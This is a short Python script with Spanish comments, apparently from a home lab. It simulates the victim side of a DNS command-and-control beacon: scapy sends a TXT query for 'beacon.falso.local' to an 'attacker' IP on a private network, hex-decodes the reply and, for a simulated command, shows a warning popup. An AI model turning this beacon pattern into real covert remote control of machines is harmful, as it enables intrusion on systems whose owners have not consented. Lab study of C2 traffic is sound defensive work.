# dns_victim_client.py (Ejecutar en la Máquina Virtual: 192.168.1.19)
from scapy.all import IP, UDP, DNS, DNSQR, sr1
import tkinter as tk
from tkinter import messagebox

# Configuración con la IP de tu PC principal
IP_ATACANTE = "192.168.1.14" 
DOMINIO_BEACON = "beacon.falso.local"

def mostrar_alerta_visual(mensaje):
    root = tk.Tk()
    root.withdraw()
    messagebox.showwarning("¡Alerta Crítica de Seguridad!", mensaje)
    root.destroy()

def llamar_al_c2():
    print(f"[*] Solicitando instrucciones a C2 ({IP_ATACANTE}) vía DNS...")
    
    # Petición DNS explícita tipo TXT apuntando a la IP de tu PC
    paquete_dns = IP(dst=IP_ATACANTE)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=DOMINIO_BEACON, qtype="TXT"))
    
    respuesta = sr1(paquete_dns, timeout=5, verbose=0)
    
    if respuesta and respuesta.haslayer(DNS) and respuesta[DNS].ancount > 0:
        rdata = respuesta[DNS].an.rdata
        if isinstance(rdata, list):
            rdata = rdata[0]
            
        try:
            payload_hex = rdata.decode('utf-8')
            comando = bytes.fromhex(payload_hex).decode('utf-8')
            print(f"[+] Respuesta recibida y decodificada: {comando}")
            
            if comando.startswith("CMD_SIM:Show-Alert:"):
                mensaje_alerta = comando.split(":", 2)[2].replace("_", " ")
                print(f"[!] Ejecutando orden visual...")
                mostrar_alerta_visual(mensaje_alerta)
                
        except Exception as e:
            print(f"[-] Error al procesar datos: {e}")
    else:
        print("[-] Sin respuesta del servidor C2. ¿Está corriendo el script en el atacante?")

if __name__ == "__main__":
    llamar_al_c2()